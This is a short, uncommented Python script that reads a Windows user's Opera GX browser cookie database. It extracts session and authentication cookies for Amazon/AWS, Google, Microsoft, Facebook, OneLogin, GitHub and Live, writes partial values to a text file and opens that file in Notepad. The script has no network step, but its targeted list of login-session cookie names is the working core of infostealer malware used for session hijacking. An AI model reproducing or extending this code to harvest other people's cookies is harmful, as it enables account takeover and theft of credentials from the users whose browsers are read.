import sqlite3, os

profile = "Default"
opera_path = os.path.join("C:\\Users\\Paulo\\AppData\\Roaming\\Opera Software\\Opera GX Stable", profile, "Cookies")

conn = sqlite3.connect(opera_path)
cur = conn.cursor()
cur.execute("SELECT host_key, name, value FROM cookies")
cookie_data = cur.fetchall()

target_cookies = {
    ".amazon.com": ["aws-userInfo", "aws-creds"],
    ".google.com": ["OSID", "HSID", "SID", "SSID", "APISID", "SAPISID", "LSID"],
    ".microsoftonline.com": ["ESTSAUTHPERSISTENT"],
    ".facebook.com": ["c_user", "cs"],
    ".onelogin.com": ["sub_session_onelogin.com"],
    ".github.com": ["user_session"],
    ".live.com": ["RPSSecAuth"],
}

with open("cookie_dump.txt", "w") as output:
    for cookie in cookie_data:
        for domain in target_cookies:
            if cookie[0].endswith(domain) and cookie[1] in target_cookies[domain]:
                output.write(f"{cookie[0]} {cookie[1]} {cookie[2][:20]}\n")

os.system("notepad.exe cookie_dump.txt")
